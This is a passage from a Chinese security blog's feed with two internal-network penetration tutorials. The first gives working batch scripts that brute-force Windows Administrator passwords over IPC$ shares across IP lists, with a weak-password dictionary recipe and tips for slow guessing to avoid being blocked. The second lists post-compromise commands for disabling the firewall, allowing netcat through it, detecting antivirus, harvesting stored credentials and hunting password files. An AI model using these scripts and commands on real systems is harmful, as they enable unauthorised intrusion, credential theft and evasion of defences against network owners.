title="批量爆破"></a>批量爆破</h3><p>内网中爆破弱口令时首选的便是使用<code>ipc</code>，爆破错误次数一般也不会做限制，但是一定要注意爆破成功的结果是否为匿名权限的<code>ipc</code>连接。</p><p>弱口令爆破这种手段在在内网中是一把双刃剑，如果公司领导未过于重视网络安全的话，导致信息安全部地位低下、资金有限，那么在缺乏安全设备监控与员工网络安全意识低下的情况下，在内网进行弱口令爆破是一件非常高效地事情，如大部分的央企、国企二级单位。</p><p>但另一方面，如果该公司确实在网络安全方面投入较大人力财力，那么弱口令爆破无异于自杀。</p><p>弱口令字典可由部分简单口令和部分复杂规则口令与企业名称+年份组成，如<code>12345678</code>,<code>000000</code>,<code>1q2w3e4r</code>,<code>1qaz2wsx</code>,<code>baidu@2020</code>,<code>baidu@123</code>等，不宜超过100条且建议单线程慢速爆破，避免被拦截。</p><p>使用说明：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ip.txt 放入要爆破的IP</span><br><span class="line">pass.txt 放入爆破的密码</span><br><span class="line">默认爆破用户：Administrator</span><br><span class="line">爆破成功的结果，会在bat运行的当前目录生成pic.txt</span><br><span class="line">爆破进度的查询：type log.txt，完成后当前目录生成end.txt</span><br></pre></td></tr></table></figure><p><strong>坑点：需注意特殊字符，如密码中有 <code>%</code> 需要用 <code>%</code> 来转义，例 ：<code>123#$%</code> 应转化为 <code>123#$%%</code></strong> </p><p>1.给定多个密码爆破</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">cls</span></span><br><span class="line"><span class="built_in">echo</span> Useage: %<span class="number">0</span> ip.txt pass.txt</span><br><span class="line"><span class="keyword">FOR</span> /F %%i <span class="keyword">in</span> (%<span class="number">1</span>) <span class="keyword">do</span> (</span><br><span class="line"><span class="keyword">FOR</span> /F %%p <span class="keyword">in</span> (%<span class="number">2</span>) <span class="keyword">do</span> (</span><br><span class="line"><span class="built_in">echo</span> net use \\%%i\ipc<span class="variable">$</span> <span class="string">&quot;%%p&quot;</span> /user:<span class="string">&quot;%%i\Administrator&quot;</span> &gt;&gt; log.txt</span><br><span class="line">net use \\%%i\ipc<span class="variable">$</span> <span class="string">&quot;%%p&quot;</span> /user:<span class="string">&quot;%%i\Administrator&quot;</span>  &gt;NUL <span class="number">2</span>&gt;NUL</span><br><span class="line"><span class="keyword">IF</span> NOT errorlevel <span class="number">1</span> (</span><br><span class="line"><span class="built_in">echo</span> %%p  t:%%i&gt;&gt; pic.txt</span><br><span class="line">net use \\%%i\ipc<span class="variable">$</span> /<span class="built_in">del</span></span><br><span class="line">)</span><br><span class="line">net use * /<span class="built_in">del</span> /y &gt;NUL <span class="number">2</span>&gt;NUL</span><br><span class="line">)</span><br><span class="line">)</span><br><span class="line"><span class="built_in">echo</span> <span class="keyword">end</span> &gt;&gt; end.txt</span><br></pre></td></tr></table></figure><p>2.固定密码</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">cls</span></span><br><span class="line"><span class="built_in">echo</span> Useage: %<span class="number">0</span> ip.txt</span><br><span class="line"><span class="keyword">FOR</span> /F %%i <span class="keyword">in</span> (%<span class="number">1</span>) <span class="keyword">do</span> (</span><br><span class="line"><span class="built_in">echo</span> net use \\%%i\ipc<span class="variable">$</span> <span class="string">&quot;123456&quot;</span> /user:<span class="string">&quot;%%i\Administrator&quot;</span> &gt;&gt; log.txt</span><br><span class="line">net use \\%%i\ipc<span class="variable">$</span> <span class="string">&quot;123456&quot;</span> /user:<span class="string">&quot;%%i\Administrator&quot;</span>  &gt;NUL <span class="number">2</span>&gt;NUL</span><br><span class="line"><span class="keyword">IF</span> NOT errorlevel <span class="number">1</span> (</span><br><span class="line"><span class="built_in">echo</span> success:%%i&gt;&gt; pic.txt</span><br><span class="line">net use \\%%i\ipc<span class="variable">$</span> /<span class="built_in">del</span></span><br><span class="line">)</span><br><span class="line">net use * /<span class="built_in">del</span> /y &gt;NUL <span class="number">2</span>&gt;NUL</span><br><span class="line">)</span><br><span class="line"><span class="built_in">echo</span> <span class="keyword">end</span> &gt;&gt; end.txt</span><br></pre></td></tr></table></figure><h3 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h3><p>温馨小提示：有杀软的内网环境中，尽量用<code>windows</code>自带功能来完成需求，使用工具要慎重，一定要本地做好测试在丢到目标上运行。</p><h4 id="PSEXEC"><a href="#PSEXEC" class="headerlink" title="PSEXEC"></a>PSEXEC</h4><p>不推荐，很容易就被杀软拦截，<a href="https://download.sysinternals.com/files/PSTools.zip">微软官方pstools</a> </p><p>域渗透学习（五）基于IPC的远程连接： <a href="https://ares-x.com/2020/03/21/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%94%EF%BC%89%E5%9F%BA%E4%BA%8EIPC%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5/">https://ares-x.com/2020/03/21/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%94%EF%BC%89%E5%9F%BA%E4%BA%8EIPC%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5/</a> </p><h4 id="Impacket套件"><a href="#Impacket套件" class="headerlink" title="Impacket套件"></a>Impacket套件</h4><p>更多的连接方式还有 <code>smbexec</code>、<code>psexec</code>、<code>atexec</code>， 都可在github社区中找到，比较简单的就是在 <code>impacket</code> 工具<br>包找到相关文件，使用方法自行查阅帮助文档，这里不再赘述。</p><p>python版：<a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p><p>exe版：<a href="https://github.com/ropnop/impacket_static_binaries/releases">https://github.com/ropnop/impacket_static_binaries/releases</a>    v0.9.19稳</p><p>Impacket套件之远程命令执行功能讲解： <a href="https://mp.weixin.qq.com/s/kVTAe2BLya-lwOXzKdvHGA">https://mp.weixin.qq.com/s/kVTAe2BLya-lwOXzKdvHGA</a> </p><h4 id="Ladon"><a href="#Ladon" class="headerlink" title="Ladon"></a>Ladon</h4><table><thead><tr><th align="left">模块功能</th><th align="left">目标端口</th><th align="left">目标系统</th><th align="left">使用教程</th></tr></thead><tbody><tr><td align="left">SMB爆破/IPC/共享</td><td align="left">445端口</td><td align="left">Windows</td><td align="left"><a href="http://k8gege.org/Ladon/SmbScan.html">http://k8gege.org/Ladon/SmbScan.html</a></td></tr><tr><td align="left">Netbios爆破</td><td align="left">139端口</td><td align="left">Windows</td><td align="left"><a href="http://k8gege.org/Ladon/NbtScan.html">http://k8gege.org/Ladon/NbtScan.html</a></td></tr><tr><td align="left">SMB-NtlmHash爆破</td><td align="left">445端口</td><td align="left">Windows</td><td align="left"><a href="http://k8gege.org/Ladon/SmbHashScan.html">http://k8gege.org/Ladon/SmbHashScan.html</a></td></tr></tbody></table>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;基于IPC的横向移动&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="内网渗透" scheme="https://www.se7ensec.cn/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透|内网中的信息收集</title>
    <link href="https://www.se7ensec.cn/2020/07/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>https://www.se7ensec.cn/2020/07/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2020-07-12T07:10:24.000Z</published>
    <updated>2020-11-14T19:53:53.820Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>无论是通过外网打点，还是水坑钓鱼，进入内网后的第一步，也是最重要的一步就是信息收集，而且信息收集往往是一直穿插在整个内网渗透过程中。</p></blockquote><a id="more"></a><h2 id="工作组和域的区分"><a href="#工作组和域的区分" class="headerlink" title="工作组和域的区分"></a>工作组和域的区分</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.ipconfig /all</span><br><span class="line">有Primary Dns Suffix（主 DNS 后缀）就说明是域内，空的则当前机器应该在工作组。</span><br><span class="line"><span class="number">2</span>.net config workstation </span><br><span class="line">=工作组特征=</span><br><span class="line">------------------------------------------------</span><br><span class="line">软件版本                      Windows <span class="number">10</span> Home China</span><br><span class="line">工作站域                       WORKGROUP</span><br><span class="line">登录域                          MicrosoftAccount</span><br><span class="line">------------------------------------------------</span><br><span class="line">=域特征=</span><br><span class="line">------------------------------------------------</span><br><span class="line">工作站域                     HACK7</span><br><span class="line">工作站域 DNS 名称            hack7.local</span><br><span class="line">登录域                       HACK7</span><br><span class="line">------------------------------------------------</span><br><span class="line"><span class="number">3</span>.systeminfo</span><br><span class="line">这里注意字体大小写，工作组一般都是全大写，但是遇到的也有小写的情况，暂时不明白怎么设置的</span><br><span class="line">=工作组特征=</span><br><span class="line">------------------------------------------------</span><br><span class="line">域:               WORKGROUP</span><br><span class="line">------------------------------------------------</span><br><span class="line">=域特征=</span><br><span class="line">------------------------------------------------</span><br><span class="line">域:               hack7.local</span><br><span class="line">------------------------------------------------</span><br><span class="line"><span class="number">4</span>.net time /domain</span><br><span class="line">=工作组特征=</span><br><span class="line">------------------------------------------------</span><br><span class="line">找不到域 WORKGROUP 的域控制器。</span><br><span class="line">请键入 NET HELPMSG <span class="number">3913</span> 以获得更多的帮助。</span><br><span class="line">------------------------------------------------</span><br><span class="line">=域特征=[需要域用户才能成功查询]</span><br><span class="line">------------------------------------------------</span><br><span class="line">\\DC.hack7.local的当前时间是<span class="number">2020</span>/<span class="number">7</span>/<span class="number">12</span> <span class="number">13</span>:<span class="number">21</span>:<span class="number">32</span></span><br><span class="line">------------------------------------------------</span><br></pre></td></tr></table></figure><h2 id="工作组内信息收集"><a href="#工作组内信息收集" class="headerlink" title="工作组内信息收集"></a>工作组内信息收集</h2><p>工作组采取的一般都是常规渗透方法，因为工作组一般都是个人和少数服务器。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">通常使用的方法有：</span><br><span class="line">扫描网段中的web服务，常用的有phpstudy，wampserver等，来寻找搭建的服务漏洞</span><br><span class="line">扫描开放端口信息，以及对应的服务，判断是否存在漏洞。</span><br><span class="line">扫描主机由于没有更新到最新版本导致的系统漏洞，比如MS17-010，补丁号为KB4013389</span><br><span class="line">hash抓取，hash注入，hash碰撞，口令爆破，IPC登陆，WMI，未授权访问，文件共享系统。</span><br><span class="line">ARP嗅探&#x2F;欺骗攻击（Cain和Ettercap）</span><br><span class="line">DNS劫持，会话劫持。</span><br><span class="line">社会工程学</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h3><h4 id="用户系统信息收集"><a href="#用户系统信息收集" class="headerlink" title="用户系统信息收集"></a>用户系统信息收集</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.查看当前用户权限</span><br><span class="line">whoami /all</span><br><span class="line"><span class="number">2</span>.查看系统信息</span><br><span class="line">systeminfo</span><br><span class="line">systeminfo /S <span class="number">192.168</span>.<span class="number">1.101</span> /U testlab\test /P <span class="string">&quot;test&quot;</span> 查看远程机器的系统配置</span><br><span class="line"><span class="number">3</span>.查当前机器的机器名,知道当前机器是干什么的</span><br><span class="line">hostname</span><br><span class="line"><span class="number">4</span>.查看在线用户,注意管理员此时在不在</span><br><span class="line">quser</span><br><span class="line">query user</span><br><span class="line">qwinsta</span><br><span class="line"><span class="number">5</span>.查当前机器中所有的用户名,开始搜集准备用户名字典</span><br><span class="line">net user</span><br><span class="line"><span class="number">6</span>.查当前机器中所有的组名,了解不同组的职能,如：IT,HR,admin,file</span><br><span class="line">net localgroup</span><br><span class="line"><span class="number">7</span>.查指定组中的成员列表</span><br><span class="line">net localgroup <span class="string">&quot;Administrators&quot;</span></span><br><span class="line"><span class="number">8</span>.查询本机所有的盘符</span><br><span class="line">wmic logicaldisk get description,name,size,freespace /value</span><br><span class="line">fsutil fsinfo drives</span><br><span class="line">fsutil fsinfo volumeinfo C:|findstr <span class="string">&quot;卷名&quot;</span> 查看卷名称，需要管理员权限</span><br><span class="line"><span class="number">9</span>.防火墙相关</span><br><span class="line">netsh firewall show state查看防火墙状态</span><br><span class="line">netsh firewall show config查看防火墙配置</span><br><span class="line">设置防火墙日志存储位置：</span><br><span class="line">netsh advfirewall <span class="built_in">set</span> currentprofile logging filename <span class="string">&quot;C:\Windows\temp\FirewallLOG.log&quot;</span></span><br><span class="line">关闭防火墙：</span><br><span class="line">netsh firewall get opmode disable  (WIN2003之前)</span><br><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off (WIN2003之后)</span><br><span class="line">允许某个程序的全连接：</span><br><span class="line">netsh firewall add allowdprogram C:\nc.exe <span class="string">&quot;allow nc&quot;</span> enable   (WIN2003之前)</span><br><span class="line">允许某个程序连入：</span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">&quot;pass nc&quot;</span> <span class="built_in">dir</span>=<span class="keyword">in</span> action=allow program=<span class="string">&quot;C:\nc.exe&quot;</span></span><br><span class="line">允许某个程序外连：</span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">&quot;pass nc&quot;</span> <span class="built_in">dir</span>=<span class="keyword">in</span> action=allow program=<span class="string">&quot;C:\nc.exe&quot;</span></span><br><span class="line"><span class="number">10</span>.其他</span><br><span class="line"><span class="built_in">set</span> 查看当前机器的环境变量配置,看有没有我们可以直接利用到的语言环境</span><br><span class="line">ver 查看当前机器的NT内核版本,不弹窗</span><br><span class="line">winver 查看当前机器的NT内核版本,弹窗，在非图形界面不执行这个命令</span><br><span class="line">fsutil fsinfo drives 列出当前机器上的所有盘符</span><br><span class="line">net share 查看当前机器开启的共享</span><br><span class="line">driverquery 查看当前机器安装的驱动列表</span><br><span class="line">net share public_dir=<span class="string">&quot;c:\public&quot;</span> /grant:Everyone,Full 设置共享</span><br><span class="line"><span class="built_in">dir</span> /a<span class="literal">-r</span><span class="literal">-d</span> /s /b找当前用户可读写目录,可能会很多</span><br></pre></td></tr></table></figure><h4 id="网络连接信息收集"><a href="#网络连接信息收集" class="headerlink" title="网络连接信息收集"></a>网络连接信息收集</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.查看tcp/udp网络连接状态信息</span><br><span class="line">netstat <span class="literal">-ano</span> 查看本机所有的tcp,udp端口连接及其对应的pid</span><br><span class="line">netstat <span class="literal">-anob</span> 查看本机所有的tcp,udp端口连接,pid及其对应的发起程序</span><br><span class="line">netstat <span class="literal">-ano</span> | findstr <span class="string">&quot;ESTABLISHED&quot;</span> 查看当前正处于连接状态的端口及ip</span><br><span class="line">netstat <span class="literal">-ano</span> | findstr <span class="string">&quot;LISTENING&quot;</span> 查看当前正处于监听状态的端口及ip</span><br><span class="line">netstat <span class="literal">-ano</span> | findstr <span class="string">&quot;TIME_WAIT&quot;</span> 查看当前正处于等待状态的端口及ip</span><br><span class="line"><span class="number">2</span>.查看网络配置</span><br><span class="line">ipconfig /all</span><br><span class="line"><span class="number">3</span>.查看本地DNS缓存</span><br><span class="line">ipconfig /displaydns</span><br><span class="line"><span class="number">4</span>.查看路由表</span><br><span class="line">route print</span><br><span class="line"><span class="number">5</span>.查找有价值的内网arp通信记录</span><br><span class="line">arp <span class="literal">-a</span></span><br><span class="line"><span class="number">6</span>.跟踪本机出口ip</span><br><span class="line">tracert <span class="number">8.8</span>.<span class="number">8.8</span></span><br></pre></td></tr></table></figure><h4 id="软件进程信息收集"><a href="#软件进程信息收集" class="headerlink" title="软件进程信息收集"></a>软件进程信息收集</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.查看杀毒软件</span><br><span class="line">wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState,pathToSignedProductExe</span><br><span class="line"><span class="number">2</span>.查看本机安装程序</span><br><span class="line">wmic product get name /value</span><br><span class="line">wmic product get name,version</span><br><span class="line"><span class="number">3</span>.查看当前机器的进程信息</span><br><span class="line">tasklist /svc 显示当前机器所有的进程所对应的服务 [只限于当前用户有权限看到的进程]</span><br><span class="line">tasklist /m 显示本地所有进程所调用的dll [同样只限于当前用户有权限看到的进程]</span><br><span class="line">tasklist /v 寻找进程中有无域管启用的进程，或者杀软进程</span><br><span class="line">tasklist /S <span class="number">192.168</span>.<span class="number">1.1</span> /U testlab\test /P <span class="string">&quot;test&quot;</span>查看远程主机进程列表</span><br><span class="line">taskkill /im iexplore.exe /f 用指定进程名的方式强行结束指定进程</span><br></pre></td></tr></table></figure><h4 id="历史凭证信息收集"><a href="#历史凭证信息收集" class="headerlink" title="历史凭证信息收集"></a>历史凭证信息收集</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">引用自：https://github.com/klionsec/RedTeamer</span><br><span class="line">批量抓取当前机器上的 <span class="string">&quot;各类基础服务配置文件中保存的各种账号密码&quot;</span></span><br><span class="line">   比如,各种数据库连接配置文件,各类服务自身的配置文件(redis,http basic...)...</span><br><span class="line">想办法 <span class="string">&quot;控制目标 运维管理 / 技术人员 的单机,从这些机器上去搜集可能保存着各类敏感网络资产的账号密码表&quot;</span></span><br><span class="line">   比如, *.ls,*.doc,*.docx, *.txt....</span><br><span class="line">抓取各类 <span class="string">&quot;数据库客户端工具中保存各种数据库连接账号密码</span></span><br><span class="line"><span class="string">   比如,Navicat,SSMS[MSSQL自带客户端管理工具,里面也可能保存的有密码(加密后的base64)]</span></span><br><span class="line"><span class="string">抓取当前系统 &quot;</span>注册表中保存的各类账号密码hash<span class="string">&quot; [ Windows ]</span></span><br><span class="line"><span class="string">抓取当前系统所有 &quot;</span>本地用户的明文密码/hash<span class="string">&quot; [ Windows &amp; linux ]</span></span><br><span class="line"><span class="string">抓取当前系统的所有 &quot;</span>用户token<span class="string">&quot; [ Windows ]</span></span><br><span class="line"><span class="string">抓取 &quot;</span>windows凭据管理器中保存的各类连接账号密码<span class="string">&quot;</span></span><br><span class="line"><span class="string">抓取 &quot;</span>MSTSC 客户端中保存的所有rdp连接账号密码<span class="string">&quot;</span></span><br><span class="line"><span class="string">抓取各类 &quot;</span>VNC客户端工具中保存的连接密码<span class="string">&quot;</span></span><br><span class="line"><span class="string">抓取 &quot;</span>GPP目录下保存的各类账号密码<span class="string">&quot; [ 包括组策略目录中XML里保存的密码hash 和 NETLOGON目录下的某些脚本中保存的账号密码 ]</span></span><br><span class="line"><span class="string">抓取各类 &quot;</span>SSH客户端工具中保存的各种linux系统连接账号密码<span class="string">&quot;, SecureCRT,Xshell,WinSCP,putty</span></span><br><span class="line"><span class="string">抓取各类 &quot;</span>浏览器中保存的各种web登录密码和cookie信息<span class="string">&quot;,Chrome [360浏览器],Firefox,IE,QQ浏览器</span></span><br><span class="line"><span class="string">抓取各类 &quot;</span>数据库表中保存的各类账号密码hash<span class="string">&quot;</span></span><br><span class="line"><span class="string">抓取各类 &quot;</span>FTP客户端工具中保存的各种ftp登录账号密码<span class="string">&quot;, filezila, xftp...</span></span><br><span class="line"><span class="string">抓取各类 &quot;</span>邮件客户端工具中保存的各种邮箱账号密码<span class="string">&quot;, forxmail, thunderbird...</span></span><br><span class="line"><span class="string">抓取各类 &quot;</span>SVN客户端工具中保存的所有连接账号密码及项目地址<span class="string">&quot;</span></span><br><span class="line"><span class="string">抓取各类 &quot;</span>VPN客户端工具中保存的各种vpn链接账号密码<span class="string">&quot;</span></span><br></pre></td></tr></table></figure><h4 id="用户敏感文件收集"><a href="#用户敏感文件收集" class="headerlink" title="用户敏感文件收集"></a>用户敏感文件收集</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.指定目录下搜集各类敏感文件</span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*.txt&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*.xml&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*.mdb&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*.sql&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*.mdf&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*.eml&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*.pst&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*conf*&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*bak*&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*pwd*&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*pass*&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*login*&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*user*&quot;</span></span><br><span class="line"><span class="number">2</span>.指定目录下的文件中搜集各种账号密码</span><br><span class="line">findstr /<span class="built_in">si</span> pass *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class="line">findstr /<span class="built_in">si</span> userpwd *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class="line">findstr /<span class="built_in">si</span> <span class="built_in">pwd</span> *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class="line">findstr /<span class="built_in">si</span> login *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class="line">findstr /<span class="built_in">si</span> user *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class="line"><span class="number">3</span>.查看,删除 指定文件</span><br><span class="line"><span class="built_in">type</span> c:\windows\temp\admin_pass.bak 查看某个文件内容</span><br><span class="line"><span class="built_in">del</span> d:\ad\*.* /a /s /q /f 强制删除指定路径下的所有文件</span><br><span class="line">tree /F /A D:\ &gt;&gt; file_list.txt 导出指定路径下的文件目录结构</span><br><span class="line"><span class="built_in">rd</span> /q/s c:\windows\temp\test 删除文件夹</span><br></pre></td></tr></table></figure><h3 id="存活主机探测"><a href="#存活主机探测" class="headerlink" title="存活主机探测"></a>存活主机探测</h3><p>基于icmp</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /L %I <span class="keyword">in</span> (<span class="number">0</span>,<span class="number">1</span>,<span class="number">254</span>) <span class="keyword">DO</span> @ping <span class="literal">-w</span> <span class="number">1</span> <span class="literal">-n</span> <span class="number">1</span> <span class="number">192.168</span>.<span class="number">7</span>.%I | findstr <span class="string">&quot;TTL=&quot;</span> &gt;&gt; pinglive.txt</span><br></pre></td></tr></table></figure><p>扫描的话建议直接在内网进行扫描，速度和准确率都比较有保障。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">常用的工具[最多<span class="number">10</span>秒一个<span class="type">c</span>段]：nbtscan[基于<span class="type">smb</span>和<span class="type">netbios</span>的内网主机发现方式]、Ladon、自开发工具</span><br><span class="line">socks代理扫描：goby</span><br></pre></td></tr></table></figure><h2 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h2><p>下文仅限于域内的信息收集，均不会涉及域内认证原理等概念，后面会对windows认证方式单独写一篇总结。</p><h3 id="net组件搜集域内信息"><a href="#net组件搜集域内信息" class="headerlink" title="net组件搜集域内信息"></a>net组件搜集域内信息</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 